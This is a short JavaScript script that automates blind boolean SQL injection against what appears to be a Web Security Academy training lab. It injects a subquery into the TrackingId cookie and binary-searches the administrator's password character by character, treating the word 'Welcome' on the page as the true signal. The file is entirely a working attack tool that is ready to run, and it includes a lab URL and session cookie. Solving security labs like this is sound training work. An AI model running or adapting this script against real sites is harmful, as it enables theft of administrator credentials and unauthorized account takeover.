import fetch from "node-fetch";

// Value length, you can find it from findLength script
const length = 20;
// This string can be found on page, when SQL request is true
const flag = "Welcome";

async function findChar(i) {
  // ASCII printable char codes
  let start = 32;
  let end = 126;

  // You must use '>' operator and 'middle','i' variables in SQL query!
  while (true) {
    let middle = Math.floor((start + end) / 2);

    // URL
    const url = new URL(
      "https://0ab400e503b6e9b4c0d045ab00f80025.web-security-academy.net/login"
    );

    // Method, headers and body
    const options = {
      method: "GET",
      headers: {
        Cookie: `TrackingId=BlzXFEUoJcpSPeyv' and (select ascii(substring(password,${i},1)) from users where username='administrator')>${middle}-- ; session=jNtHoYLdZR0uT4BU5i2UzrqhVazM5NWa`,
        "User-Agent":
          "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
      },
      // body: '',
    };
    const response = await fetch(url, options);
    const responseText = await response.text();
    const greaterThanMiddle = responseText.includes(flag);
    const twoValues = end - start <= 1;
    if (twoValues && greaterThanMiddle) {
      return end;
    } else if (twoValues && !greaterThanMiddle) {
      return start;
    } else if (greaterThanMiddle) {
      start = middle + 1;
    } else {
      end = middle;
    }
  }
}

async function findValue() {
  const requestArray = [];
  for (let i = 1; i <= length; i++) {
    requestArray.push(findChar(i));
  }
  const responseArray = await Promise.all(requestArray);
  const value = responseArray.reduce(
    (previous, current) => previous + String.fromCharCode(current),
    ""
  );
  return value;
}

// Call function and check run time
console.log("Please wait...");
const timeBefore = new Date();
const answ = await findValue();
const timeAfter = new Date();
const seconds = Math.round((timeAfter - timeBefore) / 1000);
console.log("Value:", answ, "Spend time:", seconds, "seconds");
